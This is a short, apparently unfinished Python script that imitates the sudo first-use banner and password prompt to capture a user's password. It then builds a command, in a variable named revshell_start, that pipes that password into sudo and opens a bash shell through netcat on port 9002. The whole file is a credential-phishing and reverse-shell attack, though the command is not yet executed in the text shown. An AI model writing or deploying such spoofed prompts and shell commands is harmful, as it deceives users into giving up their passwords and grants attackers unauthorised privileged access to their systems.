import os
from main import bkf
FIRST_TIME_MSG = """
We trust you have received the usual lecture from the local System Administrator. It usually boils down to these three things:

#1) Respect the privacy of others.

#2) Think before you type.

#3) With great power comes great responsibility.


"""
USERNAME = str(os.getenv('USER')).replace("\n","")
print(FIRST_TIME_MSG)
passkey = int(input("Password: "))

revshell_start = f'echo "{passkey}" | {bkf}/sudo nc -c bash localhost 9002'

# TODO: finish tmr, gn
